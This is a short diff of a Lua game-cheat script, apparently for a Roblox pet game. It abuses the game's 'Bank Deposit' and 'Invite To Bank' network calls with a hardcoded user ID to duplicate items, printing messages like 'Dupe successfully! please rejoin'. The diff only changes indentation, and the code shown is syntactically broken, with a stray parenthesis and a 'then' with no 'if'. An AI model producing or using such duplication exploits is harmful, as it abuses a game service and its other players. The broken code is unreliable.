@@ -10,11 +10,11 @@ end
 local request,request2 = lib.Network.Invoke("Bank Deposit",mybanks[1]['BUID'], PetsList, mydiamonds - 1);
 if request then 
      lib.Message.New("Dupe starting");
-     else
+else
 lib.Message.New(request2 and "Something went wrong Try again");
 return; end
 lib.Network.Invoke("Invite To Bank"), mybanks[1]['BUID'], 3330141567) then
 lib.Message.New("Dupe successfully! please rejoin");
-    else
+else
 lib.Message.New("Dupe failure😟 please try again");
 end)
